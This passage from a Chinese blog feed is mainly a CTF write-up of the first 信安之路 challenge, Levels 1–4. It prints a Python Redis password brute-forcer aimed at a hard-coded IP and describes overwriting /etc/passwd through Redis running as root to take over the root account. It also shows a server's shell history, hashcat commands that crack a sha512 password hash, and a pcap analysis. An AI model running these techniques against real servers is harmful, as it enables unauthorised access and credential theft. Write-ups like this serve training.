title="结语"></a>结语</h4><p>以上的种种测试，均是自行配置设备，再自行测试，学术不精，见谅。实践出真知，了解攻击原理，有助于更好部署防御措施。“害群之马者坏人也，非兵也”，自行斟酌，三思后行。</p><p><strong>ps:</strong></p><p><code>本文由安全客原创发布</code>  </p><p><code>转载，请参考</code><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a><code>，注明出处：</code> <a href="https://www.anquanke.com/post/id/162209" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162209</a>  </p><p><code>安全客 - 有思想的安全新媒体</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;随着技术的发展，无线网络&lt;code&gt;wifi&lt;/code&gt;遍布每个角落，殊不知隐藏其中的风云涌动。&lt;/p&gt;
    
    </summary>
    
    
      <category term="wifi" scheme="https://jianghuxia.github.io/tags/wifi/"/>
    
  </entry>
  
  <entry>
    <title>首届信安之路巅峰挑战赛writeup详解</title>
    <link href="https://jianghuxia.github.io/2018/09/27/%E9%A6%96%E5%B1%8A%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%B7%85%E5%B3%B0%E6%8C%91%E6%88%98%E8%B5%9Bwriteup%E8%AF%A6%E8%A7%A3/"/>
    <id>https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/</id>
    <published>2018-09-26T17:30:07.000Z</published>
    <updated>2018-09-26T17:32:36.604Z</updated>
    
    <content type="html"><![CDATA[<p>拿了首届信安之路巅峰挑战赛第一，这次比赛的<code>writeup</code>如下，<code>orz</code>，<code>orz</code>。<br><a id="more"></a></p><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level_1"></a>Level_1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">欢迎参加首届信安之路巅峰挑战赛，第一关的入口：</span><br><span class="line"></span><br><span class="line">http://wifiseciloveyouxazl.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第二关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>选择题为主，最后一题例外，为此，还抓了个包，研究了下<code>js</code>脚本</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671101647.png" alt="1537671101647"></p><p>看下脚本</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671166487.png" alt="1537671166487"></p><p>火狐抓个包，得到<code>key</code>?这<code>tm</code>什么原理。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671058562.png" alt="1537671058562"></p><h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level_2"></a>Level_2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜通关第一关，第二关入口：</span><br><span class="line"></span><br><span class="line">http://nizhidaoqianduanyoushama.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第三关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>我滴个天啊。。。。。弱密码随意登陆。。。。。不好意思，这题我真是非预期解法，具体的预期解法，之前信安之路文章已发，就不仔细讲述啦！</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537674858782.png" alt="1537674858782"></p><p>得到第二关答案<code>key:2c4b23c265c3e834f31024533565f2be</code></p><h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level_3"></a>Level_3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第二关，第三关的入口：</span><br><span class="line"></span><br><span class="line">http://honglanduikburongyiya.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第四关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>这题，学到的东西很多，坑点多，但就是好玩。</p><p>日常扫端口</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705229073.png" alt="1537705229073"></p><p>没发现啥（这时候也没全<code>tcp</code>端口扫描），后面出题老哥放出新提示</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710317853.png" alt="1537710317853"></p><p>上网搜搜，嗯 ,<code>6379 Redis</code>很有可能哦。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710120269.png" alt="1537710120269"></p><p>尝试一波，发现<code>6379</code>端口开的是<code>redis</code>服务，执行命令<code>redis-cli -h 66.42.84.155 -p 6379</code>，发现可以登录，但是需要密码。</p><p>尝试使用<code>hydra</code>爆破，但是不知为啥，爆破无效（这里上网搜索了下，说是<code>hydra</code>编译问题），于是尝试使用<code>python</code>脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">import getopt</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">author:Qing</span><br><span class="line">try to login the redis database</span><br><span class="line">-h help</span><br><span class="line">-P password file</span><br><span class="line">-a server address</span><br><span class="line">-o port, default 6379</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print &apos;&apos;&apos;Options:</span><br><span class="line">-h help</span><br><span class="line">-P password file</span><br><span class="line">-a server address</span><br><span class="line">-o port, default 6379</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">port = 6379  # default port</span><br><span class="line">starttime = time.localtime()</span><br><span class="line">print &quot;start time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, starttime)</span><br><span class="line">opts, args = getopt.getopt(sys.argv[1:], &quot;hP:a:o:&quot;)</span><br><span class="line">for op, value in opts:</span><br><span class="line">    if op == &quot;-P&quot;:</span><br><span class="line">        input_file = value</span><br><span class="line">    elif op == &quot;-a&quot;:</span><br><span class="line">        host = value</span><br><span class="line">    elif op == &quot;-o&quot;:</span><br><span class="line">        port = value</span><br><span class="line">    elif op == &quot;-h&quot;:</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">fo = open(&quot;hydra_zidian.txt&quot;, &quot;r+&quot;)</span><br><span class="line">passwd = &quot; &quot;</span><br><span class="line">while 1:</span><br><span class="line">    host = &apos;66.42.84.155&apos;</span><br><span class="line">    port=6379</span><br><span class="line">    line = fo.readline()</span><br><span class="line">    passwd = line</span><br><span class="line">    passwd = passwd[0:(len(passwd) - 1)]  # filter the /n</span><br><span class="line">    print passwd</span><br><span class="line">    rs = redis.Redis(host, port, db=0, password=passwd)  # AUTH password</span><br><span class="line">    response = &apos;wrong passwd&apos;</span><br><span class="line">    try:</span><br><span class="line">        response = rs.ping()  # use PING to judge the state of redis</span><br><span class="line">    except redis.exceptions.ResponseError:</span><br><span class="line">        pass</span><br><span class="line">    # print response</span><br><span class="line">    else:</span><br><span class="line">        if response == True:</span><br><span class="line">            print response</span><br><span class="line">            print passwd</span><br><span class="line">            fo.close()</span><br><span class="line">            stoptime = time.localtime()</span><br><span class="line">            print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">            exit(0)</span><br><span class="line">    if not line:</span><br><span class="line">        print &quot;no valid passwd&quot;</span><br><span class="line">        stoptime = time.localtime()</span><br><span class="line">        print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">        exit(0)</span><br></pre></td></tr></table></figure><p>字典选择<code>top100</code>弱密码就行啦，开始爆破。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683344278.png" alt="1537683344278"></p><p>爆破成功，密码是：<code>1q2w3e4r</code></p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683400926.png" alt="1537683400926"></p><p>嗯~，爆破是成功了，但是怎么利用<code>redis</code>漏洞呢，可以看看这篇<a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="noopener">文章</a>，其中详细指出了一些想法。</p><p>自己测试时，发现<code>/root/.ssh/</code>这个目录不在了，想着利用<code>redis</code>写入自己私钥，远程<code>ssh</code>连接上去的幻想也就破灭了。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705728399.png" alt="1537705728399"></p><p>后面尝试着，网上学习了一波，尝试着读下<code>/etc/</code>这个目录，喔！竟然存在，嘿嘿，那么是不是可以尝试<code>/etc/passwd</code> 文件实现任意账号密码的重置呢？具体操作请查看上述那个链接，下面是自己的操作：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705840894.png" alt="1537705840894"></p><p>好的，成功<code>save</code>后，尝试以<code>root</code>用户登陆，然后就这样登上去了，<code>root</code>用户登上去了?^–$–*/，还是有点吃惊的，赶快联系了下出题的大佬，问下就这样？这是预期解法？直接用<code>root</code>?后面问了下，<code>redis</code>是用<code>root</code> 身份启动，被菜鸡我刚好撞上了，直接把<code>root</code>密码重置了。甚至，不小心把<code>/etc/shadow</code>给搞坏了，抱歉啊，不是故意的。</p><p>查看下敏感信息</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537694656137.png" alt="1537694656137"></p><p>后面老哥给了我个<code>admin</code>的用户账号和密码，心虚的我也不好意思的接受了。咳，继续解题。回到<code>root</code>用户登陆后，用<code>root</code>权限转了一圈，看了下<code>/tmp/history</code>，以下为内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr tmp]<span class="comment"># cat history </span></span><br><span class="line">    1  yum update</span><br><span class="line">    2  yum list | grep rredis</span><br><span class="line">    3  yum list | grep redis</span><br><span class="line">    4  yum install redis</span><br><span class="line">    5  redis-cli</span><br><span class="line">    6  iptables</span><br><span class="line">    7  iptables -L</span><br><span class="line">    8  iptables -L -F</span><br><span class="line">    9  iptables  -F</span><br><span class="line">   10  redis-cli</span><br><span class="line">   11  yum install redis-server</span><br><span class="line">   12  wget http://download.redis.io/releases/redis-3.2.12.tar.gz</span><br><span class="line">   13  tar xzfv redis-3.2.12.tar.gz </span><br><span class="line">   14  <span class="built_in">cd</span> redis-3.2.12</span><br><span class="line">   15  ls</span><br><span class="line">   16  make</span><br><span class="line">   17  ls</span><br><span class="line">   18  <span class="built_in">cd</span> ../</span><br><span class="line">   19  rm -rf *</span><br><span class="line">   20  wget wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">   21  tar xzfv redis-2.8.17.tar.gz </span><br><span class="line">   22  yum install gcc</span><br><span class="line">   23  yum install cc</span><br><span class="line">   24  yum install g++</span><br><span class="line">   25  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   26  make</span><br><span class="line">   27  make install</span><br><span class="line">   28  <span class="built_in">cd</span> ../</span><br><span class="line">   29  redis -cli</span><br><span class="line">   30  redis-cli</span><br><span class="line">   31  <span class="built_in">cd</span> redis-2.8.17/s</span><br><span class="line">   32  <span class="built_in">cd</span> redis-2.8.17/</span><br><span class="line">   33  ls</span><br><span class="line">   34  <span class="built_in">cd</span> src/</span><br><span class="line">   35  l</span><br><span class="line">   36  ls</span><br><span class="line">   37  <span class="built_in">cd</span> ../</span><br><span class="line">   38  vim redis.conf </span><br><span class="line">   39  yum install vim</span><br><span class="line">   40  ls</span><br><span class="line">   41  vim redis.conf </span><br><span class="line">   42  <span class="built_in">cd</span> src/</span><br><span class="line">   43  ./redis-server </span><br><span class="line">   44  ./redis-server &amp;</span><br><span class="line">   45  ps -ef</span><br><span class="line">   46  ifconfig</span><br><span class="line">   47  <span class="built_in">cd</span></span><br><span class="line">   48  useradd key P@ssword123</span><br><span class="line">   49  useradd key</span><br><span class="line">   50  passwd key</span><br><span class="line">   51  cat /etc/shadow</span><br><span class="line">   52  ls</span><br><span class="line">   53  mkdir .ssh</span><br><span class="line">   54  key 的明文密码就是下一关通关密语</span><br><span class="line">   55  <span class="built_in">exit</span></span><br><span class="line">   56  ls -la</span><br><span class="line">   57  cat .bash_history </span><br><span class="line">   58  <span class="built_in">exit</span></span><br><span class="line">   59  quit</span><br><span class="line">   60  <span class="built_in">exit</span></span><br><span class="line">   61  ls</span><br><span class="line">   62  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   63  ls</span><br><span class="line">   64  <span class="built_in">cd</span> sec</span><br><span class="line">   65  <span class="built_in">cd</span> src</span><br><span class="line">   66  vim  redis-server </span><br><span class="line">   67  redis-server </span><br><span class="line">   68  redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">   69  netstat -tunlp</span><br><span class="line">   70  redis-server </span><br><span class="line">   71  netstat -tunlp</span><br><span class="line">   72  ./redis-server </span><br><span class="line">   73  redis-cli ../redis.conf &amp;</span><br><span class="line">   74  netstat -tunlp</span><br><span class="line">   75  <span class="built_in">jobs</span> </span><br><span class="line">   76  redis-server ../redis.conf &amp;</span><br><span class="line">   77  netstat -tunlp</span><br><span class="line">   78  <span class="built_in">cd</span> /home/</span><br><span class="line">   79  ls</span><br><span class="line">   80  <span class="built_in">cd</span> key/</span><br><span class="line">   81  ls</span><br><span class="line">   82  ls -al</span><br><span class="line">   83  <span class="built_in">cd</span> ..</span><br><span class="line">   84  <span class="built_in">cd</span> </span><br><span class="line">   85  <span class="built_in">cd</span> /root/</span><br><span class="line">   86  ls</span><br><span class="line">   87  passwd key</span><br><span class="line">   88  <span class="built_in">cd</span> /root/.ssh/</span><br><span class="line">   89  ls</span><br><span class="line">   90  <span class="built_in">cd</span> ..</span><br><span class="line">   91  ls</span><br><span class="line">   92  ls -al</span><br><span class="line">   93  <span class="built_in">cd</span> .ssh/</span><br><span class="line">   94  ls</span><br><span class="line">   95  ls -al</span><br><span class="line">   96  <span class="built_in">cd</span> ..</span><br><span class="line">   97  rm -rf .ssh/</span><br><span class="line">   98  <span class="built_in">cd</span> /home/</span><br><span class="line">   99  ls</span><br><span class="line">  100  <span class="built_in">cd</span> key/.ssh</span><br><span class="line">  101  mkdir key/.ssh/</span><br><span class="line">  102  <span class="built_in">cd</span> /home/</span><br><span class="line">  103  ls</span><br><span class="line">  104  <span class="built_in">cd</span> key/</span><br><span class="line">  105  <span class="built_in">cd</span> .ssh/</span><br><span class="line">  106  ls</span><br><span class="line">  107  rm authorized_keys </span><br><span class="line">  108  <span class="built_in">cd</span> </span><br><span class="line">  109  <span class="built_in">history</span> </span><br><span class="line">  110  <span class="built_in">cd</span> /home/key/.ssh/</span><br><span class="line">  111  ls</span><br><span class="line">  112  cat authorized_keys </span><br><span class="line">  113  rm authorized_keys </span><br><span class="line">  114  ls</span><br><span class="line">  115  rm authorized_keys </span><br><span class="line">  116  <span class="built_in">cd</span> ..</span><br><span class="line">  117  <span class="built_in">cd</span> </span><br><span class="line">  118  useradd <span class="built_in">test</span></span><br><span class="line">  119  useradd guest</span><br><span class="line">  120  useradd admin</span><br><span class="line">  121  useradd redis</span><br><span class="line">  122  passwd <span class="built_in">test</span></span><br><span class="line">  123  passwd guest</span><br><span class="line">  124  passwd admin</span><br><span class="line">  125  mkdir /home/admin/.ssh/</span><br><span class="line">  126  mkdir /home/<span class="built_in">test</span>/.ssh/</span><br><span class="line">  127  mkdir /home/guest/.ssh/</span><br><span class="line">  128  ls</span><br><span class="line">  129  <span class="built_in">cd</span> /home/</span><br><span class="line">  130  ls -L 1 </span><br><span class="line">  131  ls </span><br><span class="line">  132  <span class="built_in">cd</span> admin/</span><br><span class="line">  133  ls</span><br><span class="line">  134  ls -al</span><br><span class="line">  135  <span class="built_in">cd</span> ..</span><br><span class="line">  136  ls</span><br><span class="line">  137  <span class="built_in">cd</span> .</span><br><span class="line">  138  <span class="built_in">cd</span> </span><br><span class="line">  139  wget https://cowtransfer.com/s/84d80d0d7b3c45</span><br><span class="line">  140  wget https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=%E9%AB%98%E9%A2%91%E5%AD%97%E5%85%B8.zip</span><br><span class="line">  141  netstat -tunlp</span><br><span class="line">  142  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br><span class="line">  143  <span class="built_in">cd</span> /tmp/</span><br><span class="line">  144  vim <span class="built_in">history</span> </span><br><span class="line">  145  <span class="built_in">exit</span></span><br><span class="line">  146  passwd <span class="built_in">test</span></span><br><span class="line">  147  passwd admin</span><br><span class="line">  148  passwd gue</span><br><span class="line">  149  passwd guest</span><br><span class="line">  150  <span class="built_in">history</span> &gt; /tmp/<span class="built_in">history</span></span><br></pre></td></tr></table></figure><p><code>em~</code>，我以为我找到答案了，你肯定也看到了<code>P@ssword123</code>，想多了，因为下面的命令告诉我们，大佬改了密码。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707044424.png" alt="1537707044424"></p><p>先再看看<code>/etc/shadow</code>,<code>en~</code>，密码的<code>hash</code>值都有，不是说<code>key 的明文密码就是下一关通关密语</code>吗？那试试爆破<code>key</code>用户的<code>hash</code>值咯。结果再爆破这里，巨坑，有两种工具可以爆破，一种<code>john</code>，一种<code>hashcat</code>，<code>john</code>不知啥原因，<code>kali</code>、<code>ubuntu</code>下均报错，折腾许久，还是没弄好，就去搞鼓<code>hashcat</code>。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707242063.png" alt="1537707242063"></p><p><code>hashcat</code>用的是<code>windows</code>版的，但是死活爆破不出来，这是我使用的是<code>john</code>的自带字典<code>rockyou.txt</code>，后面一直换字典，还是爆不出来。厚着脸皮去问出题大佬，大佬给了点提示，仔细看<code>history</code>文件，看了半天，还是没看出啥来，大佬看不下去了，字典在里面。哦~，于是我懂了。上面的<code>history</code>文件有这两条记录</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707972635.png" alt="1537707972635"></p><p>打开<code>https://cowtransfer.com/s/84d80d0d7b3c45</code>，提示了</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537708058489.png" alt="1537708058489"></p><p>而<code>140</code>行的<code>url</code>经过<code>URLdecode</code>后是这样的<code>https://static.cowtransfer.com/84d80d0d-7b3c-4539-932d-30c3f0869538/高频字典.zip?e=1537629504&amp;token=rkrC3sADAVnBtSQ_YTQgxi-3TEVapbu6rxmtmg0v:IDeOMk2XNjOwrk-mcTr6wnRjM84=&amp;sign=484933f3a024bcab2d8f29c659aa8aa9&amp;t=5ba65d40&amp;attname=高频字典.zip</code>更是提醒我们要用这个字典去跑<code>key</code>的<code>hash</code>值，之前我也有看到这个，还打开过，但是觉得很莫名其妙，听到大佬的提示，突然悟了。是我太菜了，<code>orz</code>。</p><p>于是下载<code>高频字典.zip</code>，然后开始爆破，破破破，不知道怎么破请看<a href="https://blog.csdn.net/mydriverc2/article/details/41384853" target="_blank" rel="noopener">Hash破解神器：Hashcat的简单使用</a>，构造以下命令:</p><p><code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 字典.txt</code></p><p>简单描述下这条命令的意思：如果<code>hashcat</code>在<code>字典.txt</code>中跑出的hash值与<code>crack.hash</code>中所求内容相同，就将<code>字典.txt</code>找到的对应值写入<code>found.txt</code>中。</p><p>于是找啊找，跑啊跑，发现跑完刚刚下载的所有<code>高频字典.zip</code>里的文件还是没找到啊，于是自己本地建了个<code>key</code>用户测试了下，发现可以跑出来啊。感觉出题大佬被我坑了（之前直接的<code>rsdis</code>命令写入，把<code>/etc/passwd</code>写坏了），后面问了下，果然，之前的那条<code>key</code>的<code>hash</code>值是跑不出来的。额。。。自作自受啊。出题老哥后面重新给了个<code>sha512</code>的值<code>$6$ZkfV4HlR$7hk5IVzAVIq1gGLJo254qMm9LT6YrnUy7iATOTc8das8pOwGPWzKMlWTczMjp5fAyYFQ1SMe/K.FIGBAX/0590</code></p><p>执行命令：<code>hashcat64.exe -m 1800 -a 0 -o found.txt crack.hash 55泄漏门（部分）.txt</code>，秒破</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537704976981.png" alt="1537704976981"></p><p>查看<code>found</code>文件：</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537709086328.png" alt="1537709086328"></p><p>第三关最终的<code>KEY</code>：<code>1314woaini1314</code></p><p>听说后面这题是这样的，觉得难度就应该降低挺多的了</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710176564.png" alt="1537710176564"></p><h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level_4"></a>Level_4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第三关，第四关的入口是：</span><br><span class="line"></span><br><span class="line">http://zuohaoyingjixiangyinghennan.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第五关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure><p>打开网页是这样的（我刚做这题的时候，页面是没有任何消息的，摸索好一阵子）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537746165267.png" alt="1537746165267"></p><p>打开网址<code>https://cowtransfer.com/s/023ab1f54dd04c</code>，提供了一个压缩包<code>HellWorld.pcapng</code>进行下载。</p><p><code>wireshark</code>三板斧试下，很快就会发现其中的<code>http</code>流存在提示，有个压缩包，里面有私钥和公钥文件。除此之外明确，攻击者内网<code>ip：10.0.3.111</code>，被攻击<code>ip：173.82.235.146</code>（攻击者的外网<code>ip</code>：<code>182.150.21.33</code>，估计出题老哥这题是在虚拟机抓的，所以会有内外网ip）</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978806267.png" alt="1537978806267"></p><p>而分组<code>10061</code>和<code>10956</code>则分析出以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dynupdate.noip.com/settings.php?username=C3A37087469&amp;pass=HMAC&#123;yuyvphyx4snkqvtgt7kiyiamtra=&#125;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;noip_host_list email=&quot;C3A37087469&quot; enhanced=&quot;false&quot; webserver=&quot;&quot;&gt;</span><br><span class="line">  &lt;domain name=&quot;ddns.net&quot; type=&quot;free&quot;&gt;</span><br><span class="line">    &lt;host name=&quot;cherishao&quot; group=&quot;&quot; wildcard=&quot;false&quot;/&gt;</span><br><span class="line">  &lt;/domain&gt;</span><br><span class="line">&lt;/noip_host_list&gt;</span><br><span class="line"></span><br><span class="line">http://dynupdate.noip.com/ducupdate.php?username=C3A37087469&amp;h[]=cherishao.ddns.net&amp;ip=182.150.21.33&amp;pass=HMAC&#123;qq6tthdbubqfp7d+t0wrgo6pykg=&#125;</span><br></pre></td></tr></table></figure><p>其中有个<code>username=C3A37087469</code>，这个是接下来的线索。另外，值得一提的是<code>passwd.jpg</code>这个图片，这个<code>http</code>传输载体<code>tcp</code>传输时，存在丢包现象，所以单纯的<code>http</code>流追踪是找不到回应的包，只能通过追踪<code>tcp</code>流查找重传的数据。</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979013881.png" alt="1537979013881"></p><p>很明显，是个图片，不过是<code>base64</code>格式，这个需要自行通过<code>html</code>标签<code>img</code>使图片显示在网页中，操作一番，如下</p><p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979226469.png" 